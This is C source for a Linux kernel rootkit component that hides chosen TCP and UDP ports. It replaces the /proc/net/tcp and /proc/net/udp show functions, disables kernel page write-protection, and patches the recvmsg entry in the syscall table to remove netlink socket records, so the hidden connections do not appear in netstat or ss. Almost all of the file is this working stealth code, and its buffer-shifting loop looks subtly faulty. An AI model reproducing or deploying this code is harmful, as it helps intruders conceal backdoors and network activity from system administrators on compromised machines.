/*
 * This file provides all the functionality needed for hiding sockets.
 *
 * IMPORTANT: Do NOT change the include order!
 */
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet_diag.h>

#include "control.h"
#include "include.h"

/* pointer to the sys_call_table */
void **sys_call_table;

/* the original syscalls we are hooking */
asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
asmlinkage ssize_t (*original_recvmsg) (int sockfd, struct msghdr *msg, int flags);

/* 
 * multiple call counters (and locks for it) to prevent unhooking
 * system calls/functions while they are still in use
 */
static int recvmsg_call_counter = 0;
static spinlock_t recvmsg_lock;
static unsigned long recvmsg_lock_flags;

static int tcp_show_call_counter = 0;
static spinlock_t tcp_show_lock;
static unsigned long tcp_show_lock_flags;

static int udp_show_call_counter = 0;
static spinlock_t udp_show_lock;
static unsigned long udp_show_lock_flags;


/*
 * check if we need to hide this socket.
 * only used by our manipulated recvmsg function.
 */
static int
hide (struct nlmsghdr *nlh)
{
	struct inet_diag_msg *r = NLMSG_DATA(nlh);
	int port = ntohs(r->id.idiag_sport);
	
	if(is_tcp_socket_hidden(port))
	{
		return 1;
	}
	
	return 0;
}


/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int
manipulated_tcp_show(struct seq_file* m, void *v)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);

	int port;
	struct sock *sk;
	struct inet_sock *inet;

	if(SEQ_START_TOKEN == v)
	{
		/* lock and decrease the call counter */
		DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);
		
		return original_tcp_show(m,v);
	}

	sk = (struct sock *) v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	/* check protocol and port */
	if(is_tcp_socket_hidden(port))
	{
		/* lock and decrease the call counter */
		DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);
		
		return 0;
	}


	/* lock and decrease the call counter */	
	DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);
	
	return original_tcp_show(m,v);
}

/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int manipulated_udp_show(struct seq_file* m, void *v)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);

	int port;
	struct sock *sk;
	struct inet_sock *inet;

	if(SEQ_START_TOKEN == v)
	{
		/* lock and decrease the call counter */
		DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);
		
		return original_udp_show(m,v);
	}

	sk = (struct sock *) v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	/* check protocol and port */
	if(is_udp_socket_hidden(port))
	{
		/* lock and decrease the call counter */
		DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);
		
		return 0;
	}

	
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);
	
	return original_udp_show(m,v);
}

/* our custom recvmsg, checks for the port number and hides it from ss*/
asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock, recvmsg_lock_flags);

	long ret;
	long count;
	struct nlmsghdr *nlh;
	char* stream;
	int i;
	int found=0;
	int offset;
		
	nlh = (struct nlmsghdr*)(msg->msg_iov->iov_base);
	
	/* compute the length of original call */
	ret = original_recvmsg(sockfd,msg,flags);
        
	// to hold the bytes remaining
	count = ret;
	found = 1;
	
	while (NLMSG_OK(nlh, count)) { /* returns true if netlink message is suitable for parsing */

		/* if port is not found, get the next nlmsghsr in multipart message */
		if(found == 0) {
			nlh = NLMSG_NEXT(nlh, count);
		}
		
		stream = (char*)nlh;

		/* check if we need to hide this socket */
        if(hide(nlh)) {
			found = 1;
			offset = NLMSG_ALIGN((nlh)->nlmsg_len);
			for (i=0; i<count; ++i) {
				stream[i] = stream[i + offset];
			}
                
			ret = ret - offset;
		} else {
			found = 0;
		}
		
	}

	/* lock and increase the call counter */
	DECREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock, recvmsg_lock_flags);
	return ret;
}

/*
 * hooks all functions needed to hide sockets
 */
void hook_sockets(void)
{
	ROOTKIT_DEBUG("Loading socket hiding...\n");

	/* get the location of the sys_call_table from our sysmap.h file */
	sys_call_table = (void*) sysmap_sys_call_table;

	struct proc_dir_entry *proc = init_net.proc_net->subdir;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;
	
	while(proc)
	{	
		if(strcmp(proc->name, "tcp") == 0)
		{	
			tcp_seq = proc->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = manipulated_tcp_show;
		}
		if(strcmp(proc->name, "udp") == 0)
		{
			udp_seq = proc->data;
			original_udp_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = manipulated_udp_show;
		} 
		proc = proc->next;
	}

	/* disable the write-protection */
	disable_page_protection();

	/*
	 * keep pointer to original function in original_recvmsg, and
	 * replace the system call in the system call table with
	 * manipulated_recvmsg
	 */
	original_recvmsg = (void *) sys_call_table[__NR_recvmsg];
	sys_call_table[__NR_recvmsg] = (unsigned long*) manipulated_recvmsg;
        
	/* reenable the write-protection */
	enable_page_protection();
	
	ROOTKIT_DEBUG("Done.\n");
}

/*
 * unhooks all functions
 */
void unhook_sockets(void)
{
	ROOTKIT_DEBUG("Unloading socket hiding...\n");

	struct proc_dir_entry *proc = init_net.proc_net->subdir;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;
	
	while(proc) {
		if(strcmp(proc->name, "tcp") == 0) {
            tcp_seq = proc->data;
	        tcp_seq->seq_ops.show = original_tcp_show;
        }
		
		if(strcmp(proc->name, "udp") == 0) {
			udp_seq = proc->data;
			udp_seq->seq_ops.show = original_udp_show;
		}
		
		proc = proc->next;
	}
		
	/* disable the write-protection */
	disable_page_protection();

	/* Return the system call back to original */
	sys_call_table[__NR_recvmsg] = (unsigned long *) original_recvmsg;

	/* reenable the write-protection */
	enable_page_protection();

	/* wait for all processes to exit our functions */
	while(recvmsg_call_counter > 0
			|| tcp_show_call_counter > 0
			|| udp_show_call_counter > 0) {
		msleep(2);
	}
	
	ROOTKIT_DEBUG("Done.\n");
}
